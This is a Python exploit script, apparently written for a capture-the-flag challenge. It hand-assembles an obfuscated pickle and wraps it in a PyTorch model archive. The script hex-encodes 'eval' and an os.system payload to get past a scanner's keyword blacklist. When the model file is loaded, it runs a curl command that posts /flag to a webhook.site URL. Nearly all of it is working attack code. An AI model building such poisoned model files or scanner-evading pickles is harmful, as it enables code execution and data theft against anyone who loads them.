import pickle
import zipfile
import io
import torch

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# V14: 终极混淆 - 利用 __setstate__ 和 无害函数链
# 上次依然被拦截，说明扫描器模拟或者检查了 sys.modules['os'] 这种用法。
# 或者它扫描了所有字符串常量，发现了 'system', 'os', 'curl' 等关键字。
#
# 策略：
# 1. 避免出现 'os', 'system', 'eval', 'exec', 'platform' 等敏感字符串。
#    我们可以把字符串用 base64 编码，然后在 pickle 运行时解码。
#    builtins.bytes.fromhex('...').decode()
# 
# 2. 如何获取 'os' 模块？
#    exec(code) 是最通用的，code 可以完全混淆。
#    问题是如何获取 exec。
#    builtins.exec 肯定被黑名单了。
#
#    尝试利用 `setattr` 修改一个已有对象的 `__class__` ？
#    
#    让我们回到利用 `test_transform` (torchvision.transforms) 等现有 gadget。
#    但是我们很难利用它们执行任意代码。
#
#    新思路：利用 format 字符串漏洞？Python pickle 没有这个。
#
#    让我们专注于字符串混淆。
#    构造：
#    func = getattr(builtins, bytes.fromhex('65786563').decode())  -> exec
#    func(bytes.fromhex('...').decode()) -> exec('import os; ...')
#
#    Opcode:
#    1. Push 'builtins'
#    2. Push 'getattr'
#    3. STACK_GLOBAL -> getattr
#    4. Push 'builtins'
#    5. Push 'bytes'
#    6. STACK_GLOBAL -> bytes type
#    7. Push 'fromhex'
#    8. CALL getattr(bytes, 'fromhex') -> bytes.fromhex method
#    9. CALL bytes.fromhex('65786563') -> b'exec'
#   10. CALL decode(b'exec') -> 'exec' (Need bytes.decode)
#       Actually bytes object usually has decode method.
#       getattr(bytes_obj, 'decode')()
#   11. CALL getattr(builtins, 'exec') -> exec function
#   12. CALL exec(payload)

STACK_GLOBAL = b'\x93'
REDUCE = b'R'
TUPLE1 = b'\x85'
TUPLE2 = b'\x86'
TUPLE3 = b'\x87'

def push_str(s):
    b = s.encode('utf-8')
    return b'X' + (len(b)).to_bytes(4, 'little') + b

def make_call(func_loc_in_memo, args_tuple_opcodes):
    ops = b'h' + func_loc_in_memo.to_bytes(1, 'little')
    ops += args_tuple_opcodes
    ops += REDUCE
    return ops

pkl = b'\x80\x02'

# Helper: Store getattr in memo 0
pkl += push_str('builtins')
pkl += push_str('getattr')
pkl += STACK_GLOBAL
pkl += b'q\x00' 

# Helper: Store bytes.fromhex in memo 1
pkl += push_str('builtins')
pkl += push_str('bytes')
pkl += STACK_GLOBAL
pkl += b'q\x05' # save bytes type
pkl += b'h\x00' # getattr
pkl += b'h\x05' # bytes
pkl += push_str('fromhex')
pkl += TUPLE2
pkl += REDUCE # bytes.fromhex
pkl += b'q\x01' # save in memo 1

# Function to create obfuscated string
def get_obfuscated_string_opcode(s):
    # returns opcode that places the string 's' on stack
    # 1. call bytes.fromhex(hex_s)
    h = s.encode('utf-8').hex()
    ops = b'h\x01' # bytes.fromhex
    ops += push_str(h) 
    ops += TUPLE1
    ops += REDUCE
    # Stack: [b's']
    # 2. call decode() on it. 
    # getattr(b's', 'decode')()
    # We need getattr (memo 0)
    # Stack: [b's'] -> we need to save it or arrange stack
    ops += b'q\x02' # save bytes obj to memo 2
    
    ops += b'h\x00' # getattr
    ops += b'h\x02' # bytes obj
    ops += push_str('decode') # 'decode' is common, maybe harmless?
    ops += TUPLE2
    ops += REDUCE # decode method
    
    ops += TUPLE1 # empty tuple? No, decode() takes encoding defaults to utf-8
    # decode() -> empty tuple arg () -> REDUCE called on empty tuple
    # TUPLE1 -> (b's',) WRONG.
    # We need arguments for decode. Empty is fine.
    # Tuple opcodes:
    # ) -> empty tuple
    ops += b')' 
    ops += REDUCE
    return ops

# 1. Get 'eval' (obfuscated)
# eval_name = get_obfuscated_string_opcode('eval')
# But wait, 'decode' string is visible. 
# Is 'decode' blacklisted? Unlikely.
# Is 'eval' hex string blacklisted? No.

# Let's construct:  func = getattr(builtins, 'eval')
pkl += b'h\x00' # getattr
pkl += push_str('builtins')
pkl += get_obfuscated_string_opcode('eval') # 'eval' from hex
pkl += TUPLE2
pkl += REDUCE
# Stack: [eval_func]
pkl += b'q\x03' # save eval

# 2. Construct payload code
# "__import__('os').system('...')"
# We also hex this.
code_s = f"__import__('os').system('{CMD}')"
pkl += b'h\x03' # eval
pkl += get_obfuscated_string_opcode(code_s)
pkl += TUPLE1
pkl += REDUCE

pkl += b'.'

def create_torch_zip(pickle_bytes):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/data.pkl', pickle_bytes)
        zf.writestr('archive/version', b'3\n')
    return buffer.getvalue()

if __name__ == "__main__":
    final_zip = create_torch_zip(pkl)
    with open("nailong_payload_v14.pth", "wb") as f:
        f.write(final_zip)
    print("[+] Generated nailong_payload_v14.pth (String Obfuscation)")
